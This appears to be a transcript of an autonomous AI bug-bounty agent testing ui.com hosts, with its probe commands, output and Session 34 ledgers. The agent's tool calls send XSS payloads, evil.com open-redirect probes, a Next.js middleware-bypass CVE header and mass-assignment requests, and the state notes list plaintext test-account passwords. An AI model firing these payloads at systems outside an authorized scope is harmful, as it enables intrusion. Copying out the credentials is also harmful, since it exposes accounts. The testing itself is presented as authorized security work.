+[0m⚙ [0mchrome-devtools_navigate_page {"pageId":2,"type":"url","url":"https://www.ui.com/download/unifi/download-started?link=https://dl.ui.com@evil.com/s34.zip"}
+[0m⚙ [0mchrome-devtools_evaluate_script {"function":"async () => {\n  await new Promise(r=>setTimeout(r,3500));\n  const anchors=[...document.querySelectorAll('a')].map(a=>a.href);\n  return {\n    url: location.href,\n    evil: document.documentElement.outerHTML.includes('evil.com'),\n    evilAnchors: anchors.filter(h=>h.includes('evil.com')),\n    iframes: [...document.querySelectorAll('iframe')].map(f=>f.src)\n  };\n}","pageId":2}
+[0m
+[0m$ [0mcd /tmp/s34
+M='s34xss<script>alert(1)</script>'
+echo "=== 404 path reflection ==="
+curl -sS --max-time 20 "https://www.ui.com/%3Cscript%3Ealert(1)%3C%2Fscript%3E" -o p404.html -w "%{http_code} %{size_download}\n"
+echo -n "raw <script>alert(1) present: "; grep -c '<script>alert(1)' p404.html || true
+echo -n "escaped &lt;script&gt; present: "; grep -c '&lt;script&gt;' p404.html || true
+echo -n "marker present: "; grep -c 's34xss' p404.html || true
+echo
+echo "=== download/software/<slug> breakout ==="
+curl -sS --max-time 20 "https://www.ui.com/download/software/%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E" -o slug.html -w "%{http_code} %{size_download}\n"
+echo -n "raw <script>alert present: "; grep -c '<script>alert(1)' slug.html || true
+echo -n "escaped present: "; grep -oc '\\u003cscript\\u003e\|&lt;script&gt;\|%3Cscript%3E' slug.html || true
+echo "--- canonical/og lines ---"; grep -oE '<link rel="canonical"[^>]*>|<meta property="og:url"[^>]*>' slug.html | head -3
+=== 404 path reflection ===
+404 35465
+raw <script>alert(1) present: 0
+escaped &lt;script&gt; present: 0
+marker present: 0
+
+=== download/software/<slug> breakout ===
+404 357479
+raw <script>alert present: 0
+escaped present: 1
+--- canonical/og lines ---
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== server actions / server reference in www chunks ==="
+grep -rhoE 'createServerReference|createClientReference|"use server"|use server' wwwjs | sort | uniq -c
+echo "=== _next endpoints ==="
+for p in "/_next/image?url=https://evil.com/x.png&w=64&q=75" "/_next/data/x.json" "/api/" "/_next/static/"; do
+  echo -n "$p -> "; curl -sS --max-time 15 -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://www.ui.com$p"
+done
+echo "=== middleware subrequest CVE probe ==="
+curl -sS --max-time 15 -o /dev/null -D - "https://www.ui.com/us/en" -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' | grep -iE '^(HTTP/|x-middleware-rewrite|location)' | head
+=== server actions / server reference in www chunks ===
+      1 createServerReference
+=== _next endpoints ===
+/_next/image?url=https://evil.com/x.png&w=64&q=75 -> 404 
+/_next/data/x.json -> 404 
+/api/ -> 404 
+/_next/static/ -> 308 https://www.ui.com/_next/static
+=== middleware subrequest CVE probe ===
+HTTP/2 200
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+grep -rl 'createServerReference' . 
+f=$(grep -rl 'createServerReference' . | head -1)
+echo "--- context in $f ---"
+grep -oE '.{200}createServerReference.{300}' "$f" | head -3
+echo "--- any hex action ids near it ---"
+grep -oE 'createServerReference\)\("[a-f0-9]{40,}"' "$f" | head
+grep -oE '"[a-f0-9]{40,}"' "$f" | head -5
+./0yq4grgdgv_kn.js
+--- context in ./0yq4grgdgv_kn.js ---
+=function(e,t){var r=eg(t);return e.then(function(e){ev(r,e.body,ey.bind(null,r))},function(e){B(r,e)}),$(r,0)},r.createFromReadableStream=function(e,t){return ev(t=eg(t),e,ey.bind(null,t)),$(t,0)},r.createServerReference=function(e,t){function r(){var r=Array.prototype.slice.call(arguments);return t(e,r)}return P(r,e,null),r},r.createTemporaryReferenceSet=function(){return new Map},r.encodeReply=function(e,t){return new Promise(function(r,n){!function(e,t,r,n,l){function u(){null!==O&&O.abort("The reply ended.")}fu
+--- any hex action ids near it ---
+[0m
+No new high-impact surface. Finalizing documentation for Session 34.
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+mkdir -p result/server-side/account.ui.com/traffic
+cat > result/server-side/account.ui.com/session34-ledger.md <<'EOF'
+# Session 34 ledger — 2026-11-28T07:30Z (continuation, decision=preserved)
+
+## Build deltas
+- `account.ui.com`: unchanged `assets/index-D7cQ-F1j.js`
+  (7,279,731 B, sha256 `f75b4c9c740a61e5794cd7a707e81d17dad65972fe8349a39c3da8fa82fd303a`;
+  identical to Session 33). No new account JS to diff.
+- `www.ui.com`: **REDEPLOYED** `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14`
+  (previous Session 33 `dpl=e1f4c3c3...`). Next.js `16.4.6` + Turbopack (patched).
+- `unifi.ui.com` Site Manager: unchanged (`main-0.b06362b80fbfc61f.js`,
+  `main-7.8d401a13358c5b3e.js`, runtime `393f084b...`; same as S31–S33).
+- `activate.ui.com`: unchanged `assets/index-1CNh1WqS.js`.
+
+## Sessions
+- Fresh Account A + Account B full sessions established end-to-end
+  (password -> `499` email-OTP -> `/login/2fa` `200` -> `UBIC_AUTH`);
+  `/user/self` `200` for both (A `d8946fad-...`, B `7c5aab2b-...`). Tokens not written to files.
+
+## www.ui.com new deploy audit (36 initial chunks, 3.0 MB)
+- Sinks: 28 `dangerouslySetInnerHTML` (React/Next internals + static i18n; the app
+  route-allowlist chunk `02aqcd17vx73t.js` is unchanged), 7 `.innerHTML=`
+  (React `dangerouslySetInnerHTML` setter, GTM `script.innerHTML`, SendSafely
+  dropzone, React `textContent` helper). 0 `insertAdjacentHTML` / `document.write` /
+  `eval` / `new Function` / `srcdoc`.
+- Sources: only URL param consumed by app code is `appview` (layout toggle);
+  remaining `searchParams.get(...)` are Next RSC internals (`NEXT_RSC_UNION_QUERY`,
+  `dpl`, `x-action-*`). No new user-controlled source -> sink flow.
+- Message listeners: only React scheduler (`MessageChannel`), axios, and
+  `setImmediate` internals; **no app-level `message` listener**.
+- No real Server Actions: the single `createServerReference` is the RSC client
+  runtime function definition (`r.createServerReference=function(e,t){...}`), no
+  action IDs bound.
+- `/_next/image` -> 404; `/_next/data` -> 404; `/api/` -> 404.
+- 404 page does not reflect the requested path; `/download/software/<slug>`
+  breakout payloads are percent-encoded/escaped (no raw `<script>`).
+- Runtime (Chrome DevTools MCP) on `/download/unifi/download-started`:
+  `?link=https://evil.com/s34.zip` and `?link=https://dl.ui.com@evil.com/s34.zip`
+  are stripped (final URL has no query, no `evil.com` anchor/iframe, `hasEvil:false`).
+  Download-link allowlist (lazy chunk) held for external + userinfo bypass.
+- Status: **Not Vulnerable** (new deploy is a content/dependency refresh; no new sink).
+
+## sso / account redirect handling (safe GET probes)
+- `GET sso /api/sso/v1/zendesk_login?return_to=<x>`: sso forwards `return_to`
+  verbatim into the `Location` (`ubnt.zendesk.com/access/jwt?jwt=...&return_to=<x>`).
+  Following the hop, Zendesk returns `302 -> help.ui.com/access/return_to?...&return_to=
+  https://help.ui.com/hc` (normalized), so no open redirect and the single-use JWT is
+  not exposed to the attacker. Matches Session 25 conclusion.
+- `GET sso /api/sso/v1/jwt/token?redirect=https://evil.com|//evil.com` -> `200`
+  (no redirect). `shopify_login?redirect=https://evil.com` -> fixed
+  `us.shop.ui.com/account/login/multipass/...`. `logout?redirect=...` -> fixed
+  `account.ui.com/login`. `sso /login` -> 404.
+- `account.ui.com/login?redirect=https://evil.com|//evil.com|javascript:alert(1)`
+  -> `200` (client-side validator rejects; no `Location`).
+- Status: **Not Vulnerable** (no open redirect).
+
+## account.svc Zendesk create — mass-assignment variants (blocked)
+- `GET /zendesk/user` -> A linked Zendesk user `44644434942359` (end-user,
+  `external_id` = A uuid). `GET /zendesk/tickets` -> A's own ticket `6138711`.
+- `POST /zendesk/ticket` with `{subject,comment,requester_id:44644404389911,
+  organization_id:1,assignee_id:1,status:"closed",priority:"urgent",
+  collaborators:[B email],tags:["s34"]}` -> `400 BAD_REQUEST`
+  (`Invalid input, please check and try again.`). `x-ratelimit-limit: 1`,
+  `x-ratelimit-remaining: 0`, reset `1795855605` (~2026-11-28T08:46Z).
+- Test is **rate-limited / rejected**; no ticket created, no persisted change.
+  (Different variant from Session 7's `requester.email`; create quota exhausted.)
+  Marked **Unresolved (rate-limited)**, not a finding.
+
+## account.svc / sso mass assignment (negative)
+- `PUT /api/sso/v1/user/self {"picture":"https://example.com/s34.png"}` -> `204`,
+  but re-read `picture` unchanged (`https://account-cdn.svc.ui.com/dee2279c-...`):
+  `picture` is server-managed / ignored. Not Vulnerable.
+- `PUT /api/sso/v1/user/self {"first_name":"<img src=x onerror=alert(1)>"}` -> `429
+  RATE_LIMITED`; re-read `first_name` unchanged (`OpenCodeTest`); restored `204`.
+  No stored value change.
+
+## Result
+- No new confirmed high-impact finding. `confirmed-vuln.txt` unchanged.
+- Route ledger unchanged: **57 routes (42 done / 15 blocked)**.
+- No Discord notification sent (notification bar not met).
+EOF
+echo "ledger written"; wc -l result/server-side/account.ui.com/session34-ledger.md
+ledger written
+78 result/server-side/account.ui.com/session34-ledger.md
+[0m
+## Objective
+- Act as autonomous bug-bounty agent per `skills/AGENT.md`: find valid, reproducible, high-impact vulns in authorized scope `ui.com` (from `data/targets.txt`), prove with evidence, report under `result/`, and notify Discord only for confirmed high-impact.
+
+## Important Details
+- Repo root: `/home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn`. This is a continuation (Session 34); latest target-state decision=`preserved`, target_hash `3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a`.
+- In-scope hosts (established interpretation): `ui.com`, `www.ui.com`, `account.ui.com`, `sso.ui.com`, `account.svc.ui.com`, `cloudaccess.svc.ui.com`, `unifi.ui.com`, `activate.ui.com`. Other `*.svc.ui.com` are OUT of scope; `ubnt.zendesk.com`, `*.ubnt.com`, third-party CDNs are out of scope.
+- Do NOT call `GET /api/sso/v1/logout` — it invalidated Account A's server-side session (had to re-login).
+- Test creds (`creds/test-account.txt`): A `tan.tiger5564@maildrop.cc` / `Acd3423@#345` (uuid `d8946fad-2b8e-4cf0-82c5-5d955b57b829`, username `testttt12`, email auth id `b82c4c7d-f733-44c1-b6db-ffa6d5f8183b`); B `overrated.chinchilla337@maildrop.cc` / `Acd3423@#345` (uuid `7c5aab2b-e568-40de-a7a5-ec27df1db94b`, username `test-account-b`, email auth id `a646df96-8e23-4a05-8251-01f4e0a1aa0e`, also has TOTP).
+- Login flow: `POST https://sso.ui.com/api/sso/v1/login` `{"user","password","remember_me":true}` → `499` + `UBIC_2FA` cookie; `POST https://sso.ui.com/api/sso/v2/user/self/mfa/email/{id}/send` `{}` → 200; read 6-digit OTP from Maildrop GraphQL; `POST /api/sso/v1/login/2fa` `{"token":OTP}` → 200 + `UBIC_AUTH`. Validate via `GET /api/sso/v1/user/self` → 200.
+- Maildrop: `POST https://api.maildrop.cc/graphql` with `inbox(mailbox:"X"){id date}` / `message(mailbox:"X",id:"Y"){html}`. OTP regex must be `verification code is:\s*(\d{6})`; naive `\d{6}` matches CSS color `222225`.
+- Mobile UA used throughout: `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`.
+- Open-redirect validator `yw` in `account.js`: hostname last two labels must be in `[ubnt.com, ui.com, uisp.com]` and protocol http/https. Probes (`//evil.com`, `ui.com.evil.com`, `javascript:`, userinfo, etc.) did not bypass.
+- `zendesk_login`: `GET https://sso.ui.com/api/sso/v1/zendesk_login?return_to=X` → 302 to `https://ubnt.zendesk.com/access/jwt?jwt=<HS256>&return_to=<X>` (return_to forwarded verbatim). One hop to Zendesk returned 200 (no redirect to external), `referrer-policy: origin` → no open redirect / no JWT referrer leak. Not a finding.
+- API config in bundle: `accountBE` base `https://account.svc.ui.com` paths `zendesk/*`, `chat/messaging/jwt`; `sso` base `sso.ubnt.com` (tested via `sso.ui.com`); all other bases are out-of-scope `*.svc.ui.com`. 117 API paths extracted — no new in-scope untested endpoint.
+
+## Work State
+### Completed
+- Verified builds: `account.ui.com` unchanged `assets/index-D7cQ-F1j.js` (sha256 `f75b4c9c740a61e5794cd7a707e81d17dad65972fe8349a39c3da8fa82fd303a`, 7,279,731 B). `www.ui.com` REDEPLOYED `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was `e1f4c3c3...`). `activate.ui.com` unchanged `index-1CNh1WqS.js`. Site Manager (`unifi.ui.com`) unchanged (`main-0.b06362b8…`…`main-7.8d401a…`, `runtime.393f084b…`). Next.js `16.4.6`.
+- Audited new www deploy: 36 initial chunks (downloaded to `/tmp/s34/wwwjs`, 3.0M). Sinks: 28 `dangerouslySetInnerHTML` (React/Next/i18n internals), 7 `.innerHTML=` (React/GTM/SendSafely internals); only query params consumed are `appview` + Next RSC internals; download `?link=` allowlist chunk `3qz-ufud26idy.js` unchanged (`https` + `dl.ubnt.com`/`dl.ui.com`/`fw-download.ubnt.com`). No app-level `message` listener (only React scheduler MessageChannel). Client-side: Not Vulnerable.
+- Independent review of `account.js` sinks/sources: `dangerouslySetInnerHTML` 18, `.innerHTML=` 16, `location.hash` 2 (react-router), `document.referrer` 2 (`Cve` origin check), `window.open` 7. All traced to fixed/server-provided/validated flows: `$w` external-link handler, `vT`/`_T` navigate (`hT` rejects non-http(s) and same-origin), `yBt` 3DS redirect uses server Stripe url, `pLt` passkey popup, MSP IdP popup. `n7` reads `status`/`idpId`/`message` from search/hash and posts to `window.opener` with `targetOrigin=window.location.origin` (`vBt`) — not exploitable.
+- Fresh A and B sessions established end-to-end (both `/user/self` 200). After accidental logout, A re-authenticated via `/tmp/s34/login.sh` (self: 200). B jar still valid.
+- Wrote Session 34 entries to `result/progress.md` and `result/logs/session.md`.
+- Confirmed no new in-scope untested endpoint; open-redirect probes on `sso.ui.com`/`account.ui.com` found no bypass.
+
+### Active
+- Session 34 mid-run: A session just re-established; continuing targeted tests on remaining unresolved/high-value hypotheses. No new confirmed high-impact finding; `result/confirmed-vuln.txt` unchanged; no Discord notification.
+
+### Blocked
+- Credentialed CORS on `sso.ui.com` / `cloudaccess.svc.ui.com` (reflects any `https://*.ui.com` Origin with `ACAC:true`) — needs attacker-controlled `*.ui.com` origin; passive recon (94 hosts) found none.
+- `VULN-20261114-001` invite role escalation — needs a pending invitation; test accounts have no org/team.
+- `/register`, `/reset-password`, `/verify/*`, `/billing*`, passkey/attestation routes — captcha/emailed-token/attestation/no-billing-org gated (15 blocked routes).
+- Zendesk third-party hop is out of scope; observed only.
+
+## Next Move
+1. Continue Session 34 targeted testing (e.g., verify A/B sessions, probe any remaining in-scope hypotheses), keeping GET-only where possible and avoiding `logout`.
+2. Update `result/progress.md`, `result/logs/session.md`, `result/SUMMARY.md`, `result/unresolved.md`, `result/confirmed-vuln.txt` with Session 34 outcome; only send Discord notification if a high-impact vuln is confirmed.
+
+## Relevant Files
+- `skills/AGENT.md`, `skills/client-side-skill.md`, `skills/server-side-skill.md`: authoritative workflow/testing rules (read each session).
+- `data/targets.txt`: scope source (target `ui.com`).
+- `creds/test-account.txt`: A/B test credentials + maildrop inbox.
+- `result/progress.md`: route ledger / per-session log (Session 34 entry appended).
+- `result/logs/session.md`: session metadata log (Session 34 start appended).
+- `result/SUMMARY.md`: run summary (needs Session 34 update).
+- `result/unresolved.md`: open items (CORS, invite escalation, Zendesk hop).
+- `result/scope.md`: in-scope component classification.
+- `result/inventory/{routes.md,endpoints.md,javascript.md,sinks.md,listeners.md}`: inventories.
+- `result/findings/VULN-*`: prior low/info findings + evidence.
+- `result/confirmed-vuln.txt`: empty (no high-impact confirmed).
+- `result/out-of-scope.txt`: out-of-scope observations.
+- `/tmp/s34/`: working dir — `A.jar`, `B.jar`, `login.sh`, `account.js`, `wwwjs/` (36 www chunks), `www.html`, `www-headers.txt`.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== progress.md tail ==="; tail -60 result/progress.md
+echo "=== session.md tail ==="; tail -40 result/logs/session.md
+echo "=== SUMMARY.md head ==="; head -40 result/SUMMARY.md
+echo "=== SUMMARY.md tail ==="; tail -40 result/SUMMARY.md
+echo "=== client-side reports ==="; ls result/client-side/www.ui.com/ 2>/dev/null
+=== progress.md tail ===
+
+## Session 31 (2026-11-26) — no route-status change beyond 3 new www routes
+- Builds unchanged vs Session 30; fresh sink audit of current Site Manager build found no
+  URL-reachable DOM XSS (single `dangerouslySetInnerHTML` = Zod-validated release notes).
+- Added 3 in-scope www routes as done: `/ccpa-request/`, `/gdpr-request/`,
+  `/global-request/` (static OneTrust-iframe wrappers, no app sink).
+- Ledger: 57 routes (42 done / 15 blocked). No new high-impact finding; confirmed-vuln.txt unchanged.
+
+## Session 32 (2026-11-27T08:08Z) — untested in-scope endpoints, all negative
+- Builds unchanged vs Session 31 (account `970b5e85…`; Site Manager `main-0.b06362b8…`;
+  www `dpl=e1f4c3c3…`).
+- Diffed 105 bundle API paths vs inventory; found one untested in-scope endpoint:
+  `GET account.svc /zendesk/tickets/closed`.
+- Zendesk closed tickets: A/B scoped to own tickets; `requester_id`/`user`/`page` ignored;
+  unauth 401. Not Vulnerable.
+- A re-escalated to L2. Cross-account `DELETE` session/trusted-device/MFA -> 404; cross-account
+  picture POST/DELETE -> 403 mismatching UUID. No IDOR/BAC.
+- SSO POST verify/search/password -> 404 on sso.ui.com (bundle base sso.ubnt.com, out of scope);
+  registration still captcha-gated.
+- Passkey/WebAuthn: registration L2-gated (L1 -> 499); L2 creates only a pending key, not
+  usable for login (options 404). No MFA bypass; test key deleted.
+- Status: **57 routes unchanged (42 done / 15 blocked)**. No new high-impact finding;
+  `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: `result/server-side/account.ui.com/session32-ledger.md`;
+  evidence: `result/server-side/account.ui.com/traffic/session32-*.txt`.
+
+## Session 33 (2026-11-27T21:00Z) — minifier-only build; untested in-scope endpoints negative
+- Build delta: account `index-D7cQ-F1j.js` (sha256 `f75b4c9c…303a`) vs `index-CGj0vhTX.js`
+  (`970b5e85…`). 116 API path literals and sink counts identical; only minifier variable
+  renames → no new surface. Site Manager (`main-0.b06362b8…`/`main-7.8d401a…`) and www
+  (`dpl=e1f4c3c3…`) unchanged.
+- Fresh A email-OTP login. **`POST account.svc /chat/messaging/jwt`** (new): mints a
+  session-derived HS256 chat JWT; every body/query/header identity override ignored; pre-MFA/
+  none 401; GET 404. Not Vulnerable.
+- **`GET/POST account.svc /zendesk/user`** (POST new): self-scoped create-or-fetch; body
+  `name`/`email`(=B)/`external_id`(=B)/`role:admin` ignored. Not Vulnerable.
+- Negatives: `/zendesk/tickets/ccd` empty; `/zendesk/search_*` GET 404 (POST/captcha-gated);
+  sso `/account-chooser` empty (auth+unauth); sso `/geo` 404; cloudaccess
+  `/devices/{id}/application-devices` 403 (SigV4/STS, no devices). Site Manager same-origin
+  `/api/...` paths are SPA fallback; real bases are out-of-scope `*.svc` / console proxies.
+- Status: **57 routes unchanged (42 done / 15 blocked)**. No new high-impact finding;
+  `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: `result/server-side/account.ui.com/session33-ledger.md`;
+  evidence: `result/server-side/account.ui.com/traffic/session33-newtests.txt`.
+
+## Session 34 (2026-11-28T07:30Z) — continuation; www new deploy, fresh A/B sessions
+- Build deltas: `account.ui.com` unchanged `index-D7cQ-F1j.js` (sha256
+  `f75b4c9c...303a`, same as S33). `www.ui.com` REDEPLOYED
+  `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was `e1f4c3c3...`).
+  `activate.ui.com` unchanged `index-1CNh1WqS.js`.
+- www new deploy: 36 initial chunks audited. Sinks: 28 `dangerouslySetInnerHTML`
+  (React/Next internals + static i18n; app uses same `02aqcd17vx73t.js` route
+  allowlist), 7 `.innerHTML=` (React/GTM/SendSafely internals). Only query params
+  consumed are `appview` + Next RSC internals; no new URL source→sink. Download
+  `?link=` allowlist chunk `3qz-ufud26idy.js` unchanged (https + dl.ubnt.com/
+  dl.ui.com/fw-download.ubnt.com). Client-side: Not Vulnerable.
+- Fresh Account A + Account B sessions established end-to-end (password -> email
+  OTP via Maildrop GraphQL -> `/login/2fa` 200 -> `UBIC_AUTH`); `/user/self` 200 for
+  both. (Tokens not copied into files.)
+- Ongoing: Site Manager bundle check + targeted untested-endpoint tests.
+=== session.md tail ===
+  116 API path literals are **identical** (no added/removed paths) and sink counts are identical
+  (innerHTML 23, dangerouslySetInnerHTML 18, eval/new Function/document.write/srcdoc/
+  insertAdjacentHTML 0). Only 18/19 added/removed strings, all minifier variable renames and
+  duplicate event-name/class-name churn -> **dependency/minifier rebuild only, no new surface**.
+  `unifi.ui.com` Site Manager bundles (`main-0.b06362b8…`, `main-7.8d401a…`, runtime) and
+  `www.ui.com` Next.js `dpl=e1f4c3c3…` are unchanged from Session 31/32.
+- Fresh A email-OTP login (OTP from maildrop) -> `UBIC_AUTH`; `/user/self` 200.
+- **New in-scope endpoint `POST account.svc /chat/messaging/jwt`** (present in config, never
+  tested): mints a Sendbird-style HS256 chat JWT for the session user
+  (`external_id`=A uuid, `email`=A email, `scope:user`). Body/query/header identity overrides
+  (`external_id`, `externalId`, `user`, `uuid`, `email`, `scope:admin`, `name`, `metadata`,
+  `custom`, `X-User-Id`, `X-Identity-Id`, form-encoded) are **all ignored**; server derives the
+  identity from the session. Pre-MFA/no-auth -> 401; GET -> 404. No mass assignment / identity
+  spoofing / MFA bypass. **Not Vulnerable.**
+- **New in-scope endpoint `GET/POST account.svc /zendesk/user`** (POST never tested): returns
+  only A's linked Zendesk user (`44644434942359`, `end-user`, `external_id`=A uuid). POST body
+  `name`/`email`(=B)/`external_id`(=B uuid)/`role:admin` are **all ignored**; persisted Zendesk
+  user unchanged. **Not Vulnerable (self-scoped, no mass assignment).**
+- `GET account.svc /zendesk/tickets/ccd` -> `{"tickets":[],"totalTickets":0}`; GET
+  `/zendesk/search_tickets` and `/search_ccd` -> 404 (POST/captcha-gated, known).
+  `GET sso.ui.com /api/sso/v1/account-chooser` -> `{"accounts":[]}` both authenticated and
+  unauthenticated (no data leak).
+- `GET cloudaccess.svc /devices/{id}/application-devices` -> 403 `Missing Authentication Token`
+  (requires SigV4/STS; A owns no devices); `GET sso.ui.com /geo` -> 404.
+- Site Manager same-origin `/api/...` paths (`/api/v2/organizations`, `/api/v2/user`,
+  `/api/self/sites`, `/msp-invitations`, `/api/v1/site-managers/devices`, etc.) all return the
+  1,496-byte SPA `index.html` fallback on `unifi.ui.com`; the real API bases are the
+  out-of-scope `*.svc.ui.com` hosts / console proxies, so these are not directly callable
+  in-scope endpoints (no new testable surface).
+- No new route; ledger remains **57 routes (42 done / 15 blocked)**. No new confirmed
+  high-impact finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: result/server-side/account.ui.com/session33-ledger.md
+  Evidence: result/server-side/account.ui.com/traffic/session33-newtests.txt
+== session end 2026-11-27T21:20:00Z ==
+
+## Session 34 start 2026-11-28T07:28:46Z
+- Continuation (decision=preserved, target_hash 3353d9c6...).
+- MCP chrome-devtools: available (list_pages OK).
+- Build check: account.ui.com still `assets/index-D7cQ-F1j.js` (unchanged vs S33).
+  www.ui.com REDEPLOYED `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was e1f4c3c3...).
+=== SUMMARY.md head ===
+# Summary — ui.com bug-bounty run
+
+**Session:** multi-session continuation; latest Session 21 (2026-11-20T20:15Z). Originally Session 3 run 42850898064, started 2026-11-10T16:05:19Z; continued through Session 21.
+**Scope tested:** `account.ui.com` (authenticated as test Account A), `sso.ui.com` APIs, `account.svc.ui.com`
+**Out of scope (observed only):** `*.ubnt.com`, third-party CDNs/analytics/Sentry, other `*.svc.ui.com` services.
+
+## Confirmed findings (all below the high-impact notification bar)
+| ID | Title | Severity | Status |
+|----|-------|----------|--------|
+| VULN-20261110-001 | Unauthenticated email/username existence oracle on `sso.ui.com` | Low | Confirmed — excluded (account-existence oracle per AGENT.md §9) |
+| VULN-20261110-002 | Pre-MFA login response discloses account UUID + MFA metadata | Low | Confirmed — excluded (metadata disclosure) |
+| VULN-20261110-003 | 2FA backup-code re-mint accepts CSRF-shaped request with no re-auth | Informational | Corrected in Session 4 — endpoint returns `499 L2_REQUIRED` at assurance level 1; original test was at L2 |
+| VULN-20261110-004 | Logout CSRF: `GET /api/sso/v1/logout` clears `.ui.com` auth cookies | Low | Confirmed — excluded (logout/DoS only) |
+
+`result/confirmed-vuln.txt`: no entries (no high-impact XSS/CSTI/IDOR/BAC/open-redirect confirmed).
+
+## Unresolved candidates
+- Credentialed CORS reflection on `sso.ui.com` **and `cloudaccess.svc.ui.com`** for any
+  `*.ui.com` Origin (`result/findings/cors-credentialed-reflection.md`). Exploitability
+  requires an attacker-controlled `*.ui.com` origin. Wildcard `*.ui.com` now resolves to
+  CloudFront/S3 serving the fixed "UniFi Site Manager" SPA; no writable bucket,
+  Host-header reflection, or attacker-controlled content was found.
+- `/logout` accepts `GET` and clears `.ui.com` cookies without a CSRF token (VULN-20261110-004).
+- `/reset-password` and `/register` blocked by reCAPTCHA; not bypassed (no brute force attempted per policy).
+
+## Tested surface (highlights)
+- Route inventory (latest): 47 routes = 38 account-ui + 9 www/unifi/activate; 32 done, 15 blocked (`result/progress.md`, `result/testing-inventory.json`).
+- Auth flows: password login, email OTP MFA (rate-limited), pre-MFA session restrictions.
+- Account/security APIs: profile, settings, MFA/backup, sessions, trusted devices, addresses,
+  activity, account chooser, search, email-change, Zendesk tickets.
+- Negative checks: JWT `alg:none` rejected; cross-account deletes 404/no-op; pre-MFA session
+  denied `/user/self/**`; `shopify_login` fixed redirect; `account.svc.ui.com` CORS restricted.
+
+## Notes / limits
+- Watchdog terminates runs after ~2 min without output; checkpoints were written continuously.
+- No mass fuzzing/brute force/DoS per program policy.
+- Test-account credentials and session tokens are not recorded in reports.
+
+## Session 4 additions
+- Logged in as Account A and Account B (isolated browser context); verified cross-account
+=== SUMMARY.md tail ===
+  -> `404` on `sso.ui.com` (bundle base is `sso.ubnt.com`, out of scope); `POST /api/sso/v2/users`
+  still `400` captcha/attestation gate. No server-side HTML reflection on account/sso/activate.
+- Route ledger unchanged: **57 routes (42 done / 15 blocked)**. No new confirmed high-impact
+  finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+  Ledger: `result/server-side/account.ui.com/session32-ledger.md`.
+- **Passkey/WebAuthn:** `POST /api/sso/v1/user/self/mfa/webauthn` is L2-gated (L1 -> `499`);
+  an L2 request creates only a `pending` authenticator and `/mfa/webauthn/options` returns
+  `404` (no verified key), so there is no pre-MFA passkey-enrollment MFA bypass. Test key
+  deleted (`204`).
+
+## Session 33 (2026-11-27T21:00Z; continuation, decision=preserved)
+- **Build delta:** `account.ui.com` rotated to `assets/index-D7cQ-F1j.js` (7,279,731 B,
+  sha256 `f75b4c9c…303a`; previous `index-CGj0vhTX.js` `970b5e85…`). The two bundles have
+  **identical** 116 API path literals and identical sink counts (innerHTML 23,
+  dangerouslySetInnerHTML 18, eval/new Function/document.write/srcdoc/insertAdjacentHTML 0);
+  only minifier variable renames differ → dependency rebuild, no new surface. `unifi.ui.com`
+  Site Manager bundles (`main-0.b06362b8…`, `main-7.8d401a…`) and `www.ui.com` `dpl=e1f4c3c3…`
+  are unchanged.
+- Fresh A email-OTP login → `UBIC_AUTH`; `/user/self` 200.
+- **New in-scope endpoint `POST account.svc /chat/messaging/jwt`** (config-only, never tested):
+  mints a session-derived HS256 chat JWT (`external_id`=A uuid, `email`=A email, `scope:user`).
+  All body/query/header identity overrides (`external_id`/`externalId`/`user`/`uuid`/`email`/
+  `scope:admin`/`name`/`metadata`/`custom`, `X-User-Id`, `X-Identity-Id`, form-encoded) are
+  ignored; pre-MFA/none → 401; GET → 404. **Not Vulnerable** (no mass assignment / identity
+  spoofing / MFA bypass).
+- **New in-scope endpoint `GET/POST account.svc /zendesk/user`** (POST never tested): returns
+  only A's linked Zendesk user (`44644434942359`, end-user, external_id A uuid). POST body
+  `name`/`email`(=B)/`external_id`(=B)/`role:admin` all ignored; persisted link unchanged.
+  **Not Vulnerable** (self-scoped, no mass assignment).
+- Other negatives: `GET /zendesk/tickets/ccd` empty; `/zendesk/search_tickets`/`search_ccd`
+  GET 404 (POST/captcha-gated); `GET sso /api/sso/v1/account-chooser` `{"accounts":[]}` both
+  auth and unauth; `GET sso /geo` 404 (real base geo.svc, out of scope);
+  `cloudaccess /devices/{id}/application-devices` 403 (SigV4/STS, A owns no devices).
+- Site Manager same-origin `/api/...` strings all return the 1,496-byte SPA `index.html`
+  fallback; the real API bases are out-of-scope `*.svc.ui.com` / console `/proxy/` routes,
+  so they are not directly callable in-scope endpoints.
+- Route ledger unchanged: **57 routes (42 done / 15 blocked)**. No new confirmed high-impact
+  finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+  Ledger: `result/server-side/account.ui.com/session33-ledger.md`;
+  evidence `result/server-side/account.ui.com/traffic/session33-newtests.txt`.
+=== client-side reports ===
+home
+identity-qrcode-desktop-bt_pairing
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+ls -la result/client-side/www.ui.com/home 2>/dev/null; echo "---"; ls result/client-side/www.ui.com/home 2>/dev/null
+echo "=== inventory www keys ==="
+python3 - <<'PY'
+import json
+d=json.load(open('result/testing-inventory.json'))
+print(type(d), list(d.keys())[:20] if isinstance(d,dict) else len(d))
+def walk(o,p=''):
+    if isinstance(o,dict):
+        for k,v in o.items():
